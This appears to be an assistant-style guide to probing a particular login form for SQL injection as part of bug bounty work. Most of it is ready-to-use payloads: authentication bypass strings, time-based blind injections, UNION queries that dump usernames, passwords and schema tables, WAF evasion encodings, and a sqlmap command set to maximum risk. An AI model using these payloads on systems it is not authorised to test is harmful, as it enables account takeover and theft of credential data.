Starting with SQL Injection (SQLi) on a login page is a sound approach for bug bounty hunting, but it's essential to structure your testing to ensure thorough and ethical analysis. Here's a step-by-step strategy and suggestions:

---

### **1. Understand the Form Structure**
- **Target Fields:** `user[email]` and `user[password]`.
- **Action URL:** `/login`.
- **Method:** `POST`.
- **CSRF Protection:** `authenticity_token` is present, indicating CSRF protection. Ensure you include this in your requests.

---

### **2. Basic SQLi Payloads**
Test the `email` and `password` fields individually with basic payloads to check for error-based SQL injection:
- `' OR 1=1--`
- `' OR '1'='1`
- `' UNION SELECT NULL, NULL--`
- `' OR EXISTS(SELECT 1)--`

If the form returns errors, observe whether they indicate SQL query failures (e.g., syntax errors) or logical bypasses.

---

### **3. Time-Based Blind SQLi**
If no error is revealed, try time-based blind SQLi:
- `' OR IF(1=1,SLEEP(5),0)--`
- `' AND IF(1=1,BENCHMARK(1000000,MD5(1)),0)--`

Monitor response times to identify delays caused by your payloads.

---

### **4. Authentication Bypass**
Attempt to bypass authentication by manipulating the fields:
- Email: `' OR 1=1--`
- Password: `anything`

Submit to see if the application bypasses authentication logic.

---

### **5. UNION-Based SQLi**
Test for UNION injection to extract data:
- `' UNION SELECT NULL, NULL--`
- `' UNION SELECT 1,2--`
- `' UNION SELECT username,password FROM users--`

Look for clues in the response that indicate successful injection.

---

### **6. Advanced Payloads**
- Determine the number of columns: `' ORDER BY 1--`, `' ORDER BY 2--`, etc.
- Explore database information:  
  ```sql
  ' UNION SELECT schema_name,NULL FROM information_schema.schemata--
  ' UNION SELECT table_name,NULL FROM information_schema.tables--
  ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
  ```

---

### **7. WAF Detection and Bypasses**
Most websites usually have a Web Application Firewall (WAF). Test payloads with common evasion techniques:
- Encoding: `%27%20OR%201=1--`
- Case manipulation: `' Or 1=1--`
- Inline comments: `' OR 1/**/=/**/1--`

---

### **8. Automate Testing**
Use tools like `sqlmap` to automate payload delivery and enumeration:
```bash
sqlmap -u "https://target.com/login" --data="user[email]=test&user[password]=test&authenticity_token=TOKEN" --risk=3 --level=5
```
Modify `--data` to include your POST payload.

---

### **9. Check for Other Injection Points**
- Is the `authenticity_token` vulnerable to SQLi?
- Test URL parameters, headers, or hidden fields.

---

### **10. Ethical Considerations**
Always:
- Avoid testing in production environments unless explicitly allowed.
- Submit only validated vulnerabilities with clear replication steps.

---

### Recommended Payloads Cheat Sheet
- **Authentication Bypass:** `' OR '1'='1`
- **Time-Based Blind SQLi:** `' AND IF(1=1,SLEEP(5),0)--`
- **Data Extraction (Columns):** `' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns--`

Start with reconnaissance payloads to gather intel, then escalate based on the responses. Good luck, and happy hunting!
